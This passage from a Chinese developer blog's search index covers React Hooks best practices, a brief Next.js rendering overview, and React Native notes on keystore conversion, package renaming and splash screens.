的当前值。\n当前的 context 值由上层组件中距离当前组件最近的\u0026lt;MyContext.Provider\u0026gt;的value prop决定。\n当组件上层最近的\u0026lt;MyContext.Provider\u0026gt;更新时，该 Hook 会触发重渲染，并使用最新传递给 MyContext provider 的 context value 值。\n即使祖先使用 React.memo 或 shouldComponentUpdate，也会在组件本身使用 useContext 时重新渲染。 别忘记 useContext 的参数必须是 context 对象本身：\n正确： useContext(MyContext)\n错误： useContext(MyContext.Consumer)\n错误： useContext(MyContext.Provider)\n调用了 useContext 的组件总会在 context 值变化时重新渲染。如果重渲染组件的开销较大，你可以 通过使用 memoization 来优化。\n使用方法 useContext(MyContext) 只是让你能够读取 context 的值以及订阅 context 的变化。你仍然需要在上层组件树中使用 \u0026lt;MyContext.Provider\u0026gt; 来为下层组件提供 context。\nconst themes = {\rlight: {\rforeground: \u0026#34;#000000\u0026#34;,\rbackground: \u0026#34;#eeeeee\u0026#34;\r},\rdark: {\rforeground: \u0026#34;#ffffff\u0026#34;,\rbackground: \u0026#34;#222222\u0026#34;\r}\r};\r------------------------Step1. 创建上下文----------------\rconst ThemeContext = React.createContext(themes.light);\r--------------------------------------------------------\rfunction App() {\rreturn (\r------------------------Step2. 提供上下文----------------\r\u0026lt;ThemeContext.Provider value={themes.dark}\u0026gt;\r\u0026lt;Toolbar /\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r--------------------------------------------------------\r);\r}\rfunction Toolbar(props) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;ThemedButton /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction ThemedButton() {\r------------------------Step3. 使用上下文---------------------\rconst theme = useContext(ThemeContext);\rreturn (\r\u0026lt;button style={{ background: theme.background, color: theme.foreground }}\u0026gt;\rI am styled by theme context!\r\u0026lt;/button\u0026gt;\r);\r--------------------------------------------------------------\r} 4. useReducer const [state, dispatch] = useReducer(reducer, initialArg, init); useState 的替代方案。它接收一个形如 (state, action) =\u0026gt; newState 的 reducer，并返回当前的 state 以及与其配套的 dispatch 方法。（如果你熟悉 Redux 的话，就已经知道它如何工作了。）\n在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。\n并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为可以向子组件传递 dispatch 而不是回调函数。\n1). 使用方法 以下是用 reducer 重写 useState 一节的计数器示例：\nconst initialState = {count: 0};\rfunction reducer(state, action) {\rswitch (action.type) {\rcase \u0026#39;increment\u0026#39;:\rreturn {count: state.count + 1};\rcase \u0026#39;decrement\u0026#39;:\rreturn {count: state.count - 1};\rdefault:\rthrow new Error();\r}\r}\rfunction Counter() {\rconst [state, dispatch] = useReducer(reducer, initialState);\rreturn (\r\u0026lt;\u0026gt;\rCount: {state.count}\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;decrement\u0026#39;})}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;increment\u0026#39;})}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r} 2). 指定初始 state 有两种不同初始化 useReducer state 的方式，可以根据使用场景选择其中的一种。\n将初始 state 作为第二个参数传入 useReducer 是最简单的方法：\nconst [state, dispatch] = useReducer(\rreducer,\r{count: initialCount}\r); React 不使用 state = initialState 这一由 Redux 推广开来的参数约定。\n有时候初始值依赖于 props，因此需要在调用 Hook 时指定。\n如果特别喜欢Redux的参数约定，可以通过调用 useReducer(reducer, undefined, reducer) 来模拟 Redux 的行为，但React不鼓励这么做。\n3). 惰性初始化 可以选择惰性地创建初始 state。为此，需要将 init 函数作为 useReducer 的第三个参数传入，这样初始 state 将被设置为 init(initialArg)。\n这么做可以将用于计算 state 的逻辑提取到 reducer 外部，这也为将来对重置 state 的 action 做处理提供了便利：\nfunction init(initialCount) {\rreturn {count: initialCount};\r}\rfunction reducer(state, action) {\rswitch (action.type) {\rcase \u0026#39;increment\u0026#39;:\rreturn {count: state.count + 1};\rcase \u0026#39;decrement\u0026#39;:\rreturn {count: state.count - 1};\rcase \u0026#39;reset\u0026#39;:\rreturn init(action.payload);\rdefault:\rthrow new Error();\r}\r}\rfunction Counter({initialCount}) {\rconst [state, dispatch] = useReducer(reducer, initialCount, init);\rreturn (\r\u0026lt;\u0026gt;\rCount: {state.count}\r\u0026lt;button\ronClick={() =\u0026gt; dispatch({type: \u0026#39;reset\u0026#39;, payload: initialCount})}\u0026gt;\rReset\r\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;decrement\u0026#39;})}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: \u0026#39;increment\u0026#39;})}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r} 4). 跳过 dispatch 如果 Reducer Hook 的返回值与当前 state 相同，React 将跳过子组件的渲染及副作用的执行。（React 使用 Object.is 比较算法 来比较 state。）\n需要注意的是，React 可能仍需要在跳过渲染前再次渲染该组件。不过由于 React 不会对组件树的“深层”节点进行不必要的渲染，所以大可不必担心。\n如果你在渲染期间执行了高开销的计算，则可以使用 useMemo 来进行优化。\n5. useCallback const memoizedCallback = useCallback(\r() =\u0026gt; {\rdoSomething(a, b);\r},\r[a, b],\r); 返回一个 memoized 回调函数。\nMemoization 在函数式编程语言的编译器中大量使用，这些语言通常使用按名称调用评估策略。\n为了避免计算参数值的开销，这些语言的编译器大量使用称为thunk 的辅助函数来计算参数值，并记住这些函数以避免重复计算。\n把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。\n当把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。 useCallback(fn, deps) 相当于 useMemo(() =\u0026gt; fn, deps)。\n依赖项数组不会作为参数传给回调函数。虽然从概念上来说它表现为：所有回调函数中引用的值都应该出现在依赖项数组中。未来编译器会更加智能，届时自动创建数组将成为可能。\nReact推荐启用 eslint-plugin-react-hooks 中的 exhaustive-deps 规则。此规则会在添加错误依赖时发出警告并给出修复建议。\n1. useCallback()的目的 React 组件中通常会创建共享相同代码的不同函数对象：\n1 2 3 4 5 6 7 8  function MyComponent() { // handleClick 在每次渲染时重新创建  const handleClick = () =\u0026gt; { console.log(\u0026#39;Clicked!\u0026#39;); }; // ... }   handleClick是MyComponent每次渲染的不同函数对象。\n因为内联函数很便宜，所以在每次渲染时重新创建函数不是问题。每个组件有几个内联函数是可以接受的。\n但在某些情况下，需要在渲染之间维护单个函数实例：\n 函数组件里面包裹一个接受函数对象的props的React.memo() 当函数对象依赖于其他钩子时，例如 useEffect(..., [callback]) 当函数有一些内部状态时，例如去抖动函数\n（基本上去抖动确保为可能发生多次的事件发送恰好一个信号。\n节流将函数接收的调用频率限制在一个固定的时间间隔内。它用于确保目标函数的调用频率不会超过指定的延迟。）。  这时，useCallback(callbackFun, deps) 就派上用场了：给定相同的依赖值deps，钩子在渲染之间返回相同的函数实例（又名记忆）：\n1 2 3 4 5 6 7 8 9  import { useCallback } from \u0026#39;react\u0026#39;; function MyComponent() { // handleClick is the same function object  const handleClick = useCallback(() =\u0026gt; { console.log(\u0026#39;Clicked!\u0026#39;); }, []); // ... }   handleClick 变量在 MyComponent 的渲染之间始终具有相同的回调函数对象。\n2. useCallback的正确用例 想象一下，有一个呈现大量数据列表的组件：\nimport useSearch from \u0026#39;./fetch-items\u0026#39;;\rfunction MyBigList({ term, onItemClick }) {\rconst items = useSearch(term);\rconst map = item =\u0026gt; \u0026lt;div onClick={onItemClick}\u0026gt;{item}\u0026lt;/div\u0026gt;;\rreturn \u0026lt;div\u0026gt;{items.map(map)}\u0026lt;/div\u0026gt;;\r}\rexport default React.memo(MyBigList); 列表可能很大，可能有数百个项目。为了防止无用的列表重新呈现，将其包装到React.memo().\nMyBigList 的父组件提供了一个知道何时单击了一个项目的处理函数：\nimport { useCallback } from \u0026#39;react\u0026#39;;\rexport function MyParent({ term }) {\r--------------------------------------------------------\rconst onItemClick = useCallback(event =\u0026gt; {\rconsole.log(\u0026#39;You clicked \u0026#39;, event.currentTarget);\r}, [term]);\r--------------------------------------------------------\rreturn (\r\u0026lt;MyBigList\rterm={term}\ronItemClick={onItemClick}\r/\u0026gt;\r);\r} onItemClick回调由useCallback()处理. 只要term是相同的，useCallback()就返回相同的函数对象。\n当MyParent组件重新渲染时，onItemClick函数对象保持不变并且不会破坏MyBigList.\n这就是useCallback()的目的和正确用法。\n3. useCallback的糟糕用例 1 2 3 4 5 6 7 8 9 10 11 12  import { useCallback } from \u0026#39;react\u0026#39;; function MyComponent() { // `useCallback()` 被无脑地使用,在这里毫无意义  const handleClick = useCallback(() =\u0026gt; { // 处理点击事件  }, []); return \u0026lt;MyChild onClick={handleClick} /\u0026gt;; } function MyChild ({ onClick }) { return \u0026lt;button onClick={onClick}\u0026gt;I am a child\u0026lt;/button\u0026gt;; }   通过使用useCallback()增加了代码复杂性。必须使depsofuseCallback(..., deps)与你在记忆化回调中使用的内容保持同步。\n总之，优化比没有优化的成本更高。\n在这里，完全可以如此处理：\nimport { useCallback } from \u0026#39;react\u0026#39;;\rfunction MyComponent() {\rconst handleClick = () =\u0026gt; {\r// handle the click event\r};\rreturn \u0026lt;MyChild onClick={handleClick} /\u0026gt;;\r}\rfunction MyChild ({ onClick }) {\rreturn \u0026lt;button onClick={onClick}\u0026gt;I am a child\u0026lt;/button\u0026gt;;\r} 4). 总结（所有性能优化的建议） 在考虑性能调整时，请记住以下语句：\n 在优化之前先分析  在决定使用优化技术时，包括记忆化，特别是useCallback()，请执行以下操作：\n 第一 分析 然后量化增加的性能（例如150ms与50ms渲染速度增加）  然后问问自己：与增加的复杂性相比，增加的性能值得使用 useCallback() 吗？\n6. useMemo 可以把 useMemo 作为性能优化的手段，但不要把它当成语义上的保证。\n将来，React 可能会选择“遗忘”以前的一些 memoized 值，并在下次渲染时重新计算它们，比如为离屏组件释放内存。\n先编写在没有 useMemo 的情况下也可以执行的代码 —— 之后再在代码中添加 useMemo，以达到优化性能的目的。\nconst memoizedValue = useMemo(() =\u0026gt; computeExpensiveValue(a, b), [a, b]); 在初始渲染期间，useMemo(compute, dependencies)调用compute，记忆计​​算结果，并将其返回给组件。\n如果在下一次渲染期间依赖项没有改变，则 useMemo() 不会调用 compute 但返回记忆值。\n但是如果在重新渲染期间依赖项发生变化，则 useMemo() 调用 compute，记忆新值并返回它。\n这就是useMemo()钩子的本质。\n如果你的计算回调使用props或state值，请确保将这些值指示为依赖项：\nconst memoizedResult = useMemo(() =\u0026gt; {\rreturn expensiveFunction(propA, propB);\r}, [propA, propB]); 1). useMemo() 一个例子 组件\u0026lt;CalculateFactorial /\u0026gt;计算输入字段的数字的阶乘。\n这是\u0026lt;CalculateFactorial /\u0026gt;组件的可能实现：\nimport { useState } from \u0026#39;react\u0026#39;;\rexport function CalculateFactorial() {\rconst [number, setNumber] = useState(1);\rconst [inc, setInc] = useState(0);\rconst factorial = factorialOf(number);\rconst onChange = event =\u0026gt; {\rsetNumber(Number(event.target.value));\r};\rconst onClick = () =\u0026gt; setInc(i =\u0026gt; i + 1);\rreturn (\r\u0026lt;div\u0026gt;\rFactorial of \u0026lt;input type=\u0026#34;number\u0026#34; value={number} onChange={onChange} /\u0026gt;\ris {factorial}\r\u0026lt;button onClick={onClick}\u0026gt;Re-render\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction factorialOf(n) {\rconsole.log(\u0026#39;factorialOf(n) called!\u0026#39;);\rreturn n \u0026lt;= 0 ? 1 : n * factorialOf(n - 1);\r} 每次更改输入值时，都会计算阶乘factorialOf(n)并\u0026rsquo;factorialOf(n) called!\u0026lsquo;记录到控制台。\n另一方面，每次单击重新渲染按钮时，inc状态值都会更新。更新inc状态值会触发\u0026lt;CalculateFactorial /\u0026gt;重新渲染。\n但是，作为次要效果，在重新渲染期间，阶乘会再次重新计算 -\u0026lsquo;factorialOf(n) called!\u0026lsquo;记录到控制台。\n当组件重新渲染时，如何记住阶乘计算？这时候就是使用 useMemo() 的时候了。\n通过使用useMemo(() =\u0026gt; factorialOf(number), [number])而不是普通的 factorialOf(number)。React 记住阶乘计算。\n改进\u0026lt;CalculateFactorial /\u0026gt;并记住阶乘计算：\nimport { useState, useMemo } from \u0026#39;react\u0026#39;;\rexport function CalculateFactorial() {\rconst [number, setNumber] = useState(1);\rconst [inc, setInc] = useState(0);\r-----------------------------------------------------------------------\rconst factorial = useMemo(() =\u0026gt; factorialOf(number), [number]);\r-----------------------------------------------------------------------\rconst onChange = event =\u0026gt; {\rsetNumber(Number(event.target.value));\r};\rconst onClick = () =\u0026gt; setInc(i =\u0026gt; i + 1);\rreturn (\r\u0026lt;div\u0026gt;\rFactorial of \u0026lt;input type=\u0026#34;number\u0026#34; value={number} onChange={onChange} /\u0026gt;\ris {factorial}\r\u0026lt;button onClick={onClick}\u0026gt;Re-render\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction factorialOf(n) {\rconsole.log(\u0026#39;factorialOf(n) called!\u0026#39;);\rreturn n \u0026lt;= 0 ? 1 : n * factorialOf(n - 1);\r} 每次更改数字的值时，\u0026lsquo;factorialOf(n) called!\u0026lsquo;都会记录到控制台。这是预期的。\n但是，如果您单击重新渲染按钮，\u0026lsquo;factorialOf(n) called!\u0026lsquo;则不会记录到控制台，因为useMemo(() =\u0026gt; factorialOf(number), [number])返回记忆化的阶乘计算。很棒！\n2). useMemo()与useCallback() useCallback() 与 useMemo() 相比，是一个更专业的钩子，可以记住回调：\nimport { useCallback } from \u0026#39;react\u0026#39;;\rfunction MyComponent({ prop }) {\rconst callback = () =\u0026gt; {\rreturn \u0026#39;Result\u0026#39;;\r};\rconst memoizedCallback = useCallback(callback, [prop]);\rreturn \u0026lt;ChildComponent callback={memoizedCallback} /\u0026gt;;\r} 在上面的示例中，useCallback(() =\u0026gt; {...}, [prop])只要prop依赖项相同，就返回相同的函数实例。\n可以使用useMemo()做相同的方式来记忆回调：\nimport { useMemo } from \u0026#39;react\u0026#39;;\rfunction MyComponent({ prop }) {\rconst callback = () =\u0026gt; {\rreturn \u0026#39;Result\u0026#39;;\r};\rconst memoizedCallback = useMemo(() =\u0026gt; callback, [prop]);\rreturn \u0026lt;ChildComponent callback={memoizedCallback} /\u0026gt;;\r} 3). 小心使用记忆(memoization) 虽然useMemo()可以提高组件的性能，但必须确保使用和不使用挂钩来配置组件。只有在那之后才能得出是否值得记忆的结论。\n当记忆使用不当时，可能会损害性能。\n4). 结语 useMemo(() =\u0026gt; computation(a, b), [a, b])是记住昂贵计算的钩子。\n给定相同的[a, b]依赖项，一旦记忆，钩子将返回记忆值而不调用computation(a, b)\n7. useRef React.useRef()钩子创建持久化的可变值（也称为 ref/reference ），以及访问 DOM 元素。\n1). 可变值 useRef(initialValue)是一个内置的 React 钩子，它接受一个参数作为初始值并返回一个引用（又名ref）。引用是具有特殊属性的对象current。\n1 2 3 4 5 6 7 8 9 10 11 12  import { useRef } from \u0026#39;react\u0026#39;; function MyComponent() { const reference = useRef(initialValue); const someHandler = () =\u0026gt; { // Access reference value:  const value = reference.current; // Update reference value:  reference.current = newValue; }; // ... }   reference.current 访问 ref 值，reference.current = newValue 更新 ref 值。很简单。\n用例：记录按钮点击 该组件LogButtonClicks使用ref来存储按钮的点击次数：\nimport { useRef } from \u0026#39;react\u0026#39;;\rfunction LogButtonClicks() {\rconst countRef = useRef(0);\rconst handle = () =\u0026gt; {\rcountRef.current++;\rconsole.log(`Clicked ${countRef.current} times`);\r};\rconsole.log(\u0026#39;I rendered!\u0026#39;);\rreturn \u0026lt;button onClick={handle}\u0026gt;Click me\u0026lt;/button\u0026gt;;\r} const countRef = useRef(0)创建一个用countRef初始化的ref0。\n单击按钮时，handle将调用函数并递增ref值：countRef.current++。ref值记录到控制台。\n更新ref值countRef.current++不会触发组件重新渲染。这可以通过'I rendered!'在初始渲染时仅记录到控制台一次的事实来证明，并且在更新ref时不会发生重新渲染。\n现在提出一个合理的问题：ref和state之间的主要区别是什么？\n1.1). ref 和 state 的区别 重用LogButtonClicks组件，但这次使用useState()钩子来计算按钮点击次数：\nimport { useState } from \u0026#39;react\u0026#39;;\rfunction LogButtonClicks() {\rconst [count, setCount] = useState(0);\rconst handle = () =\u0026gt; {\rconst updatedCount = count + 1;\rconsole.log(`Clicked ${updatedCount} times`);\rsetCount(updatedCount);\r};\rconsole.log(\u0026#39;I rendered!\u0026#39;);\rreturn \u0026lt;button onClick={handle}\u0026gt;Click me\u0026lt;/button\u0026gt;;\r} 每次单击时，都会在控制台中看到消息\u0026rsquo;I rendered!\u0026rsquo;—— 这意味着每次更新状态时，组件都会重新渲染。\n因此，引用和状态之间的两个主要区别：\n 更新ref不会触发重新渲染，而更新state会使组件重新渲染； ref更新是同步的（更新后的ref值立即可用），而state更新是异步的（重新渲染后更新状态变量）。  从更高的角度来看，ref存储副作用的基础结构数据，而state存储直接呈现在屏幕上的信息。\n用例：实现秒表 可以将副作用的ref基础结构数据存储在内部。例如，可以存储到ref指针中：计时器 ID、套接字 ID 等。\n该组件Stopwatch使用setInterval(callback, time)计时器功能每秒增加秒数的计数器。计时器 id 存储到ref中timerIdRef：\nimport { useRef, useState, useEffect } from \u0026#39;react\u0026#39;;\rfunction Stopwatch() {\rconst timerIdRef = useRef(0);\rconst [count, setCount] = useState(0);\rconst startHandler = () =\u0026gt; {\rif (timerIdRef.current) { return; }\rtimerIdRef.current = setInterval(() =\u0026gt; setCount(c =\u0026gt; c+1), 1000);\r};\rconst stopHandler = () =\u0026gt; {\rclearInterval(timerIdRef.current);\rtimerIdRef.current = 0;\r};\ruseEffect(() =\u0026gt; {\rreturn () =\u0026gt; clearInterval(timerIdRef.current);\r}, []);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;Timer: {count}s\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={startHandler}\u0026gt;Start\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={stopHandler}\u0026gt;Stop\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} startHandler()单击Start按钮时调用timerIdRef.current = setInterval(...)函数启动计时器并将计时器 id 保存在ref中。\n用户单击停止按钮停止秒表。停止按钮处理程序stopHandler()从ref访问计时器ID，并停止定时器clearInterval(timerIdRef.current)。\n此外，如果组件在秒表处于活动状态的情况下卸载，则useEffect()的清理功能也将停止计时器。\n在秒表示例中，ref用于存储基础设施数据 — 活动计时器 ID。\n附带挑战：通过添加重置按钮来改进秒表\n//待编写 2). 访问 DOM 元素 useRef()钩子的另一个有用的应用是访问 DOM 元素。这分 3 个步骤执行：\n 定义访问元素的ref const elementRef = useRef()； 将ref分配给ref元素的属性：\u0026lt;div ref={elementRef}\u0026gt;\u0026lt;/div\u0026gt;; 挂载后，elementRef.current指向DOM元素。  import { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction AccessingElement() {\rconst elementRef = useRef();\ruseEffect(() =\u0026gt; {\rconst divElement = elementRef.current;\rconsole.log(divElement); // logs \u0026lt;div\u0026gt;I\u0026#39;m an element\u0026lt;/div\u0026gt;\r}, []);\rreturn (\r\u0026lt;div ref={elementRef}\u0026gt;\rI\u0026#39;m an element\r\u0026lt;/div\u0026gt;\r);\r} 用例：聚焦输入 访问 DOM 元素，以便在组件挂载时关注输入字段。\n要使其工作，需要创建对输入的ref，将ref分配给标签的ref属性，并在安装后调用element.focus()元素上的特殊方法。\n这是该\u0026lt;InputFocus\u0026gt;组件的可能实现：\nimport { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction InputFocus() {\rconst inputRef = useRef();\ruseEffect(() =\u0026gt; {\rinputRef.current.focus();\r}, []);\rreturn (\r\u0026lt;input ref={inputRef} type=\u0026#34;text\u0026#34; /\u0026gt;\r);\r} const inputRef = useRef() 创建一个ref来保存输入元素。\n然后inputRef分配给输入字段的属性ref：\u0026lt;input ref={inputRef} type=\u0026quot;text\u0026quot; /\u0026gt;。\n然后，在安装后，设置inputRef.current为输入元素。现在，可以通过编程将焦点设置输入到：inputRef.current.focus()。\nRef 在初始渲染时为空 在初始渲染期间，保存 DOM 元素的ref应该是空的：\nimport { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction InputFocus() {\rconst inputRef = useRef();\ruseEffect(() =\u0026gt; {\r// Logs `HTMLInputElement` console.log(inputRef.current);\rinputRef.current.focus();\r}, []);\r// Logs `undefined` during initial rendering\rconsole.log(inputRef.current);\rreturn \u0026lt;input ref={inputRef} type=\u0026#34;text\u0026#34; /\u0026gt;;\r} 在初始渲染期间，React 仍不确定组件的输出是什么，因此还没有创建 DOM 结构。这就是为什么在初始渲染期间inputRef.current评估为undefined。\nuseEffect(callback, []) 当输入元素已经在 DOM 中创建时，钩子在挂载后立即调用回调。\ncallback的函数useEffect(callback, [])使inputRef.current访问的正确位置，因为它可以保证构建 DOM。\n3). 更新ref限制 功能组件的功能范围应该计算输出或调用钩子。\n这就是为什么不应该在组件功能的直接范围内执行更新ref（以及更新state）的原因。\n必须在useEffect()回调或处理程序（事件处理程序、计时器处理程序等）内部更新ref。\nimport { useRef, useEffect } from \u0026#39;react\u0026#39;;\rfunction MyComponent({ prop }) {\rconst myRef = useRef(0);\ruseEffect(() =\u0026gt; {\rmyRef.current++; // Good!\rsetTimeout(() =\u0026gt; {\rmyRef.current++; // Good!\r}, 1000);\r}, []);\rconst handler = () =\u0026gt; {\rmyRef.current++; // Good!\r};\rmyRef.current++; // Bad!\rif (prop) {\rmyRef.current++; // Bad!\r}\rreturn \u0026lt;button onClick={handler}\u0026gt;My button\u0026lt;/button\u0026gt;;\r} 4). 总结 useRef() 钩子创建引用。\nconst reference = useRef(initialValue)使用初始值调用会返回一个名为 reference 的特殊对象。\nref对象有一个属性current：你可以使用这个属性来读取ref值reference.current，或者更新reference.current = newValue。\n在组件重新渲染之间，引用的值是持久的。\n与更新状态相反，更新引用不会触发组件重新渲染。\n引用也可以访问 DOM 元素。将引用分配给ref您要访问的元素的属性：\u0026lt;div ref={reference}\u0026gt;Element\u0026lt;/div\u0026gt;— 该元素位于reference.current。\n8. useImperativeHandle useImperativeHandle(ref, createHandle, [deps]) useImperativeHandle 可以让你在使用 ref 时自定义暴露给父组件的实例值。在大多数情况下，应当避免使用 ref 这样的命令式代码。\nuseImperativeHandle 应当与 forwardRef 一起使用：\nfunction FancyInput(props, ref) {\rconst inputRef = useRef();\ruseImperativeHandle(ref, () =\u0026gt; ({\rfocus: () =\u0026gt; {\rinputRef.current.focus();\r}\r}));\rreturn \u0026lt;input ref={inputRef} ... /\u0026gt;;\r}\rFancyInput = forwardRef(FancyInput); 在本例中，渲染 \u0026lt;FancyInput ref={inputRef} /\u0026gt; 的父组件可以调用 inputRef.current.focus()。\n9. useDebugValue useDebugValue(value) useDebugValue 可用于在 React 开发者工具中显示自定义 hook 的标签。\n例如，自定义 Hook 章节中描述的名为 useFriendStatus 的自定义 Hook：\nfunction useFriendStatus(friendID) {\rconst [isOnline, setIsOnline] = useState(null);\r// ...\r// 在开发者工具中的这个 Hook 旁边显示标签\r// e.g. \u0026#34;FriendStatus: Online\u0026#34;\ruseDebugValue(isOnline ? \u0026#39;Online\u0026#39; : \u0026#39;Offline\u0026#39;);\rreturn isOnline;\r} React 不推荐你向每个自定义 Hook 添加 debug 值。当它作为共享库的一部分时才最有价值。\n延迟格式化 debug 值 在某些情况下，格式化值的显示可能是一项开销很大的操作。除非需要检查 Hook，否则没有必要这么做。\n因此，useDebugValue 接受一个格式化函数作为可选的第二个参数。\n该函数只有在 Hook 被检查时才会被调用。它接受 debug 值作为参数，并且会返回一个格式化的显示值。\n例如，一个返回 Date 值的自定义 Hook 可以通过格式化函数来避免不必要的 toDateString 函数调用：\nuseDebugValue(date, date =\u0026gt; date.toDateString()); ","description":"Hook 是 React 16.8 的新增特性。它可以在不编写 class 的情况下使用 state 以及其他的 React 特性","id":40,"section":"react","tags":null,"title":"Hooks 最佳实践","uri":"https://codthing.github.io/react/hooks/hooks-bp/"},{"content":"一、渲染 将 React 中编写的代码转换为 UI 的 HTML 表示形式是不可避免的工作单元。\n这个过程称为渲染。\n1. 预渲染（默认） a. 服务器端渲染  getServerSideProps React 18 和 Next 12 引入了React 服务器组件的 alpha 版本。\n服务器组件完全在服务器上呈现，不需要客户端 JavaScript 来呈现。\n此外，服务器组件允许开发人员在服务器上保留一些逻辑，并且只将该逻辑的结果发送给客户端。\n这减少了发送到客户端的包大小并提高了客户端渲染性能。  b. 静态站点生成 适合没有交互的页面，例如新闻博客等\n getStaticProps 可以在构建站点后使用\n增量静态重新\n生成来创建或更新静态页面 。这意味着如果您的数据发生变化，不必重建整个站点。  2. 客户端渲染 初始渲染工作发生在用户设备上，特定组件使用客户端渲染。\n useEffect() useSWR  二、代码存储的位置和运行的网络 1. 源服务器 当源服务器收到请求时，它会在发送响应之前进行一些计算。\n该计算工作的结果可以移动到 CDN（内容交付网络）。\n2. 内容交付网络（CDN） CDN 将静态内容（例如 HTML 和图像文件）存储在世界各地的多个位置，并放置在客户端和源服务器之间。\n当有新请求进来时，离用户最近的 CDN 位置可以用缓存的结果进行响应。\n3. 边缘（推荐） 与 CDN 类似，边缘服务器分布在世界各地的多个位置。但与存储静态内容的 CDN 不同，一些边缘服务器可以运行代码。\n这意味着缓存和代码执行都可以在靠近用户的边缘完成。\n 在 Next.js 中，可以使用Middleware在边缘运行代码，\n很快就会使用React Server Components。  ","description":"Next.js 的关键性内容","id":41,"section":"react","tags":null,"title":"Next.js 核心工作内容","uri":"https://codthing.github.io/react/next/next-content/"},{"content":"一、将.pk8 和.pem 转换成 react-native 的 debug.keystore Step1. 安装 openssl\n参考：https://stackoverflow.com/questions/42918916/npm-install-openssl-failed-on-windows-10\nStep2. 把 pkcs8 格式的私钥转换为 pkcs12 格式，生成 platform.priv.pem 文件\nopenssl pkcs8 -in platform.pk8 -inform DER -outform PEM -out platform.priv.pem -nocrypt Step3. 生成 pkcs12 格式的密钥文件,生成 platform.pk12 文件，最后的 brilliance 是 keystore 的 alias，需要输入两次密码，我们这里默认为 android\nopenssl pkcs12 -export -in platform.x509.pem -inkey platform.priv.pem -out platform.pk12 -name brilliance Step4. 生成 platform.keystore\nkeytool -importkeystore -deststorepass android -destkeypass android -destkeystore platform.keystore -srckeystore platform.pk12 -srcstoretype PKCS12 -srcstorepass android -alias brillianc 二、React-Native 重命名 package \u0026amp; 重命名 app 1. 重命名 package  Step1. 重命名文件夹\n android/app/src/main/java/MY/APP/OLD_ID/ 重命名为： android/app/src/ main/java/MY/APP/NEW_ID/\n 这里的 NEW_ID 也可能是多级文件夹，例如： com/fungmo/a08\n  Step2. 配置包 ID\n 1.在 android/app/src/main/java/MY/APP/NEW_ID/MainActivity.java 中：\npackage MY.APP.NEW_ID; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08 2.在 android/app/src/main/java/MY/APP/NEW_ID/MainApplication.java 中：\npackage MY.APP.NEW_ID; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\rimport MY.APP.NEW_ID.generated.BasePackageList; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\rClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;MY.APP.NEW_ID.ReactNativeFlipper\u0026#34;); //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08 3.在 android/app/src/main/AndroidManifest.xml 中：\npackage=\u0026#34;MY.APP.NEW_ID\u0026#34; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08 4.在 android/app/build.gradle 中：\napplicationId \u0026#34;MY.APP.NEW_ID\u0026#34; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08 5.在 android/app/BUCK 中：\nandroid_build_config(\rpackage=\u0026#34;MY.APP.NEW_ID\u0026#34; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r)\randroid_resource(\rpackage=\u0026#34;MY.APP.NEW_ID\u0026#34; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r)  Step3. 最后进行 Gradle 清理（在 /android 文件夹中）：\n gradlew clean //cmd\r//或者\r./gradlew clean //powershell 2、重命名 app 生成器不会覆盖位于 android/app/src/main/res/values/ 文件夹中的 strings.xml 文件，因此必须 手动更改 app_name 变量\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt;\r\u0026lt;resources\u0026gt;\r\u0026lt;string name=\u0026#34;app_name\u0026#34;\u0026gt;用户手册\u0026lt;/string\u0026gt;\r\u0026lt;/resources\u0026gt; 三、RN 启动屏 npm i react-native-splash-screen --save  配置参考\n Step1. 转到app/src/main/java/[packageName]并创建一个新文件SplashActivity.java然后将以下代码复制粘贴到其中。\npackage com.packagename; // Replace this with your package name 替换为自己的 package 名\rimport android.content.Intent;\rimport android.os.Bundle;\rimport androidx.appcompat.app.AppCompatActivity;\rpublic class SplashActivity extends AppCompatActivity {\r@Override\rprotected void onCreate(Bundle savedInstanceState) {\rsuper.onCreate(savedInstanceState);\rIntent intent = new Intent(this, MainActivity.class);\rstartActivity(intent);\rfinish();\r}\r} Step2. 去app/src/main/AndroidManifest.xml和修改它，如下所示使用SplashActivity： 